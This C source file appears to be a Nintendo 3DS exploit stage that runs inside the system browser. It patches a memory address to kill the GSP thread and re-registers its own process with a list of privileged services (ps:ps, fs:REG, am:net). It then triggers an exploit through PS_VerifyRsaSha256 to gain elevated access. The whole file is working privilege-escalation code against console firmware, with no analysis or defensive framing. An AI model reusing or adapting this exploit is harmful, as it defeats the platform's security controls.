#include "types.h"
#include "pointers.h"
#include "svc.h"
#include "lib.h"
#include "utils.h"

#define SPIDER_DATARO_START 0x00359000 //FIXME is this 2.1 specific?
#define SPIDER_DATABSS_START 0x003C7000 //FIXME is this 2.1 specific?

static const u8 access_bin[] =
{
    0x41, 0x50, 0x54, 0x3A, 0x55, 0x00, 0x00, 0x00, 0x79, 0x32, 0x72, 0x3A, 0x75, 0x00, 0x00, 0x00,
    0x67, 0x73, 0x70, 0x3A, 0x3A, 0x47, 0x70, 0x75, 0x6E, 0x64, 0x6D, 0x3A, 0x75, 0x00, 0x00, 0x00,
    0x66, 0x73, 0x3A, 0x55, 0x53, 0x45, 0x52, 0x00, 0x68, 0x69, 0x64, 0x3A, 0x55, 0x53, 0x45, 0x52,
    0x64, 0x73, 0x70, 0x3A, 0x3A, 0x44, 0x53, 0x50, 0x63, 0x66, 0x67, 0x3A, 0x75, 0x00, 0x00, 0x00,
    0x66, 0x73, 0x3A, 0x52, 0x45, 0x47, 0x00, 0x00, 0x70, 0x73, 0x3A, 0x70, 0x73, 0x00, 0x00, 0x00,
    0x6E, 0x73, 0x3A, 0x73, 0x00, 0x00, 0x00, 0x00, 0x61, 0x6D, 0x3A, 0x6E, 0x65, 0x74, 0x00, 0x00,
};

void main(void)
{
    svc_sleepThread(1000000);

    //patch gsp event handler addr to kill gsp thread ASAP, PA 0x267CF418
    *((u32*)(0x003F8418+0x10+4*0x4))=0x002CA520; //svc 0x9 addr
    svc_sleepThread(1000000);

    // Grab access to PS
    Handle port;
    svc_connectToPort(&port, "srv:pm");

    srv_RegisterClient(&port);

    u32 proc = 0;
    svc_getProcessId(&proc, 0xFFFF8001);

    srvUnregisterProcess(&port, proc);

    srvRegisterProcess(&port, proc, 0x18, (const void*)&access_bin[0]);

    Handle ps_handle = 0;
    srv_getServiceHandle(&port, &ps_handle, "ps:ps");

    // Perform the exploit
    PS_VerifyRsaSha256(&ps_handle);

    while(1);
}
